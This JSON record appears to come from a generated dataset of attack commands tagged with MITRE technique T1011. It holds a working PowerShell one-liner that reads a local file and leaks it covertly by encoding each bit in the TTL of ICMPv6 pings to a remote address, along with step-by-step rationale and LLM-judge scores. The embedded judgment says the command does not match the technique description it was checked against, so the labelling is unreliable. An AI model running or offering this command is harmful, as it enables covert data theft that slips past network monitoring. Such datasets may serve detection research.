{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "$d='fd00:0:0:1::7'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin'); foreach($b in $bytes){ ([Convert]::ToString($b,2).PadLeft(8,'0')).ToCharArray() | ForEach-Object { $ttl = if($_ -eq '1'){61}else{113}; Test-Connection -ComputerName $d -Count 1 -TimeToLive $ttl -IPv6 -Quiet | Out-Null } }",
  "explanation": "Encodes bits of each byte into the Time To Live (TTL) of ICMPv6 echo requests, using ICMP as an alternate network medium per T1011.",
  "rationale_steps": [
    "Convert each byte to an 8-bit binary string.",
    "Map bit values to distinct TTLs to represent 0/1.",
    "Transmit ICMPv6 echos with selected TTLs to a ULA destination."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-f38205c7-67d2d587",
  "source_prompt_hash": "f38205c7",
  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The PowerShell is well-formed with correct variable assignments, method calls, looping, and valid Test-Connection parameters, so it should parse and run.",
        "semantic_score": 2,
        "semantic_justification": "Although it plausibly exfiltrates data via ICMPv6 by encoding bits in TTL/hop-limit values, it does not use signed system script proxy execution and is misaligned with the provided technique description.",
        "combined_score": 3.5,
        "confidence": 1,
        "timestamp": "2025-10-01T21:41:54.875042Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 2.0,
    "llm_average_score": 3.5,
    "llm_verdict": "uncertain",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}